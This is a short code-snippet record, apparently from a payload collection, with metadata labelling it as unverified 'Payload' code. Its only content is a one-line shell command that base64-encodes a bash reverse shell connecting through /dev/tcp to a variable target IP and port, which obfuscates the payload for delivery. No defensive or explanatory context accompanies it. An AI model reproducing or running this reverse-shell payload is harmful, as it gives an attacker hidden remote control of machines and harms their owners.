---
id: 7e2b985d-e237-4dc1-b613-e6c659944b7b
type: code
language: Payload
verified: false
created_at: '2020-03-16T05:58:56.739040+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 7e2b985d

**Language**: Payload

```payload
echo 'bash -i >& /dev/tcp/$_TARGET_IP/$_TARGET_PORT 0>&1' | base64 -w 0
```


